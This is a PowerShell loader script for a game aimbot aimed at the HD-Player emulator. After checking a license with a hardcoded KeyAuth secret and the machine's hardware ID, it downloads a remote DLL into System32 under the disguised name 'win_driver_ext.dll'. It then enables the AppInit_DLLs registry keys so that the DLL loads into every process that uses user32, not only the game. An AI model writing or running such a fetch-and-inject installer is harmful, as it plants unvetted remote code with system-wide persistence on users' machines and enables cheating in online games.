[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- App Config (Updated) ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"
# เปลี่ยน URL ให้ชี้ไปที่ AimbotFemaleFix.dll ตามที่คุณต้องการ
$dllUrl  = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/AimbotFemaleFix.dll"

function Show-Auth {
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "   BASX FEMALE-FIX LOADER     " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $key = Read-Host " Enter License Key"
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
        $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$($initRes.sessionid)&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    Write-Host "[+] Authentication Verified." -ForegroundColor Green
    
    # 1. Download the correct DLL to System32
    $destPath = "C:\Windows\System32\win_driver_ext.dll"
    Write-Host "[*] Downloading AimbotFemaleFix.dll..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $destPath -ErrorAction Stop
        Write-Host "[+] Download Complete." -ForegroundColor Green
    } catch {
        Write-Host "[-] Download Failed. Check your GitHub Link!" -ForegroundColor Red
        return
    }

    # 2. Update Registry to Side-load the new DLL
    Write-Host "[!] Updating Windows Registry for Auto-Load..." -ForegroundColor Yellow
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    
    try {
        Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1
        Set-ItemProperty -Path $regPath -Name "AppInit_DLLs" -Value $destPath
        
        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host "  SUCCESS: AimbotFemaleFix is Active!   " -ForegroundColor Green
        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host "[*] 1. Close HD-Player (Emulator) completely." -ForegroundColor White
        Write-Host "[*] 2. Open HD-Player again." -ForegroundColor White
        Write-Host "[*] 3. The DLL will be injected automatically." -ForegroundColor White
    } catch {
        Write-Host "[-] Registry Error. Please run as Administrator!" -ForegroundColor Red
    }
}
